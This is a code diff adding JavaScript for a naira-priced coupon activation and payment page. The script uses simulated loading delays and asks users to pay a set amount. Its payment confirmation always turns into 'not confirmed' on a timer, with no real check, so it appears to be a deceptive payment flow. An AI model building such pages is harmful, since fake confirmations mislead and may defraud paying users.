@@ -707,4 +707,84 @@
 
         setTimeout(() => {
             document.getElementById('initialLoadingOverlay').style.display = 'none'; // Hide loading screen
-            document.getElementByf
+            document.getElementById('activationExplanationOverlay').style.display = 'flex'; // Show explanation
+        }, 2000); // Simulate a 2-second loading time
+    }
+
+    // Function to hide the activation explanation and show the second page
+    function hideActivationExplanation() {
+        document.getElementById('activationExplanationOverlay').style.display = 'none';
+        document.getElementById('firstPage').style.display = 'none'; // Ensure first page is hidden
+        document.getElementById('secondPage').style.display = 'flex'; // Show the second page
+        document.body.style.backgroundColor = '#1a237e'; // Change body background for the second page
+    }
+
+
+    function updateCouponMessage(amount) {
+        const couponMessageDiv = document.getElementById('couponMessage');
+        let message = "";
+
+        if (amount === 14500) {
+            message = "You selected ₦14,500. Your coupon code will be valid for one week after activation.";
+        } else if (amount === 29000) {
+            message = "You selected ₦29,000. Your coupon code will be valid for 2 weeks after activation.";
+        } else if (amount === 50000) {
+            message = "You selected ₦50,000. Your coupon code will be valid for one month after activation.";
+        }
+
+        if (message) {
+            couponMessageDiv.innerText = message;
+            couponMessageDiv.style.display = 'block';
+        } else {
+            couponMessageDiv.style.display = 'none';
+        }
+    }
+
+    function goToLoading() {
+      const couponCode = document.getElementById('fullName').value.trim();
+      const email = document.getElementById('email').value.trim();
+
+      if (!couponCode || !email) {
+        alert('Please enter your coupon code and email address.');
+        return;
+      }
+
+      document.getElementById('userEmailConfirm').innerText = email;
+
+      const displayAmountPaymentInfo = document.getElementById('displayAmountPaymentInfo');
+      displayAmountPaymentInfo.innerHTML = `${formatAsNaira(selectedAmount)} <button class="copy-btn" onclick="copyText(this.parentNode.dataset.rawAmount)">Copy</button>`;
+      displayAmountPaymentInfo.dataset.rawAmount = selectedAmount;
+
+      document.getElementById('displayAmountConfirmation').innerText = formatAsNaira(selectedAmount);
+
+      document.getElementById('formSection').style.display = 'none';
+      document.getElementById('loadingScreen').style.display = 'block';
+
+      setTimeout(() => {
+        document.getElementById('loadingScreen').style.display = 'none';
+        document.getElementById('paymentSection').style.display = 'block';
+      }, 3000);
+    }
+
+    function copyText(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Copied: " + text);
+      }).catch(err => {
+        console.error('Failed to copy text: ', err);
+        alert('Failed to copy text. Please copy manually.');
+      });
+    }
+
+    function showPaymentConfirmation() {
+        document.getElementById('paymentSection').style.display = 'none';
+        document.getElementById('paymentConfirmationSection').style.display = 'block';
+
+        paymentConfirmationTimer = setTimeout(() => {
+            document.getElementById('paymentConfirmationSection').style.display = 'none';
+            document.getElementById('paymentNotConfirmedSection').style.display = 'block';
+        }, 7000);
+    }
+  </script>
+
+</body>
+</html>
